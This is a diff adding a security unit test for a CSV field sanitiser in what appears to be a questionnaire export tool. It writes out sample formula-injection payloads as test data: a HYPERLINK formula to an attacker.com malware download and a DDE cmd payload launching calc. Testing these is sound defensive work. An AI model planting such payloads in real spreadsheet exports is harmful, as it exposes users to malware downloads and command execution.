@@ -35,3 +35,18 @@ test('SECURITY: sanitizeCsvField leaves benign values untouched', () => {
   assert.strictEqual(sanitizeCsvField('Gaming PC'), '"Gaming PC"');
   assert.strictEqual(sanitizeCsvField('1500 USD'), '"1500 USD"');
 });
+
+test('SECURITY: downloadQuestionsCSV fields neutralize malicious formula injections in options or questions', () => {
+  const maliciousQuestion = '=HYPERLINK("http://attacker.com/malware.exe", "Click here")';
+  const maliciousOption = '@SUM(1+1)*cmd|\' /C calc\'!A0';
+  const maliciousCondition = '+2+5';
+
+  const sanitizedQ = sanitizeCsvField(maliciousQuestion);
+  const sanitizedOpt = sanitizeCsvField(maliciousOption);
+  const sanitizedCond = sanitizeCsvField(maliciousCondition);
+
+  assert.ok(sanitizedQ.startsWith("\"'="), 'Hyperlink formula injection must be neutralized');
+  assert.ok(sanitizedOpt.startsWith("\"'@"), 'At-symbol formula injection must be neutralized');
+  assert.ok(sanitizedCond.startsWith("\"'+"), 'Plus formula injection must be neutralized');
+});
+
